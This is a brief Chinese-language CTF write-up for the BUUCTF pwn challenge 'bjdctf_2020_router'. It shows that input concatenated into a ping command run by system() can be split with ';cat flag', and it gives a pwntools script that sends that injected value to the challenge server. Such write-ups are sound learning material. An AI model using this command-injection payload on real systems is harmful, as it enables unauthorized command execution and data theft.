---
title: "BUUCTF Pwn Bjdctf_2020_router"
date: 2020-05-18T18:17:27+08:00
author: NiceSeven
categories:
  - BUUCTF
tags:
  - Pwn
---

# BUUCTF Pwn Bjdctf_2020_router

考点：Linux基础

![image-20200518181843168](D:\Github\myblog\static\images\image-20200518181843168.png)

![image-20200518182224441](D:\Github\myblog\static\images\image-20200518182224441.png)

将我们的输入拼接到dest处，然后执行system，所以直接输入";cat flag"分割前面的ping，执行cat flag

```python
#!/usr/bin/env python2
#-*- coding=UTF-8 -*-
from pwn import *
context.log_level = 'debug'

sh = remote('node3.buuoj.cn',25381)
sh.sendlineafter("choose:\n","1")
sh.sendlineafter("address:\n",";cat flag")
sh.interactive()
```

![image-20200518182015942](D:\Github\myblog\static\images\image-20200518182015942.png)